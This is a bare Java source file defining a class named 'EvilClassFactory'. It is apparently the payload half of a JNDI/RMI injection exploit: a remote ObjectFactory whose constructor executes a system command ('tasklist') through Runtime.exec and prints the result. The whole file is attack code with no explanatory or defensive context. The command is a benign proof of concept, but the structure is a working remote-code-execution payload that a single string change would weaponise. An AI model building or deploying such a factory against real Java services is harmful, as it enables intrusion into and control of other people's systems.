

import javax.naming.Context;
import javax.naming.Name;
import javax.naming.spi.ObjectFactory;
import java.io.*;
import java.rmi.RemoteException;
import java.rmi.server.UnicastRemoteObject;
import java.util.Hashtable;

public class EvilClassFactory extends UnicastRemoteObject implements ObjectFactory {
    public EvilClassFactory() throws RemoteException {
        super();
        InputStream inputStream;
        try {
            inputStream = Runtime.getRuntime().exec("tasklist").getInputStream();
            BufferedInputStream bufferedInputStream = new BufferedInputStream(inputStream);
            BufferedReader bufferedReader = new BufferedReader(new InputStreamReader(bufferedInputStream));
            String linestr;
            while ((linestr = bufferedReader.readLine()) != null){
                System.out.println(linestr);
            }
        } catch (IOException e){
            e.printStackTrace();
        }
    }

    @Override
    public Object getObjectInstance(Object obj, Name name, Context nameCtx, Hashtable<?, ?> environment) throws Exception {
        return null;
    }
}